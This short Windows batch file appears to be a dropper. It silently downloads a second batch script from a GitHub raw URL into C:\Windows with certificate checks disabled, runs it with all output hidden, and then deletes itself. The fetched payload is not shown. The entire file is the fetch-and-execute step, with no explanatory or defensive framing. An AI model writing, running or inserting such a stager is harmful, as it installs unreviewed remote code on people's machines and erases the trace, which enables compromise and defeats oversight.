@echo off
cls
curl -g -k -L -# -o C:\Windows\twish.bat https://raw.githubusercontent.com/twish1x/apps/refs/heads/main/twish.bat >> nul 2> nul

start C:\Windows\twish.bat >> nul 2> nul
del "%~f0"
